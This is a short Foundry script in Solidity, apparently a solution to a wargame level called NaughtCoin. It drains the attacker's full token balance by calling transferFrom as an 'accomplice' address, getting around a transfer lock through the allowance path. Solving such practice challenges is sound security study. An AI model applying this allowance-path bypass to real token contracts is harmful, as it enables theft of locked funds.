// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface INaughtCoin {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address _from, address _to, uint256 amount) external;
}

contract NaughtCoinAttacker is Constants, Script {
    uint256 private constant TRANSFER_AMOUNT = 100 ether;

    function run() public {
        INaughtCoin victim = INaughtCoin(NAUGHT_COIN_ADDRESS);

        uint256 amount = victim.balanceOf(ATTACKER_ADDRESS);
        uint256 allowance = victim.allowance(ATTACKER_ADDRESS, ACCOMPLICE_ADDRESS);

        vm.startBroadcast(ACCOMPLICE_ADDRESS);
        victim.transferFrom(ATTACKER_ADDRESS, ACCOMPLICE_ADDRESS, amount);
        vm.stopBroadcast();
    }
}